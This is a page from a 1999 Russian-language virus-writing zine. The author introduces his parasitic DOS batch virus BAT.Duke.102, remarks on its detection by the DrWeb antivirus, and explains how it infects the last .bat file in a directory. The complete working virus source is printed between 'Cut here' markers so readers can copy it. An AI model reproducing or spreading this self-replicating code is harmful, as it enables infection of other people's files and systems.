- [Duke's Virus Labs #6] - [Page 04] -

BAT.Duke.102
(c) by Duke/SMF

Имя вируса    : BAT.Duke.102
Автор         : Duke/SMF
Язык прогр.   : DOS-script
Дата создания : 02.03.99

   Странно ведут себя авторы программы DrWeb - новые вирусы в базу
добавляют, а в файлах history.dwb и drw40xxx.txt сообщений об этом нет...
Это я определил, когда заметил что мой вирус BAT.Mf.351 детектируется,
а в документации об этом нет ни слова 8-0
   Именно методом проб (без ошибок :) я узнал, что еще один мой вирус
(о котором мы сейчас и ведем речь) стал жертвой программы DrWeb :(
Теперь он детектируется программой DrWeb под именем BAT.Duke.102.
Ну что ж, пора поведать об этом вирусе более широким массам.
   Вирус является очередной попыткой написать паразитический BAT-вирус
минимальной длины. Стоит заметить, что это еще не предел... Вирус берет
последний BAT'ник текущего каталога, проверяет на зараженность и заражает.

===== Cut here =====
:: Created (c) by Duke/SMF
@ctty nul
for %%b in (*.bat) do set ctt=%%b
find "ctt"<%ctt%
if errorlevel 1 find "ctt"<%0>>%ctt%
===== Cut here =====
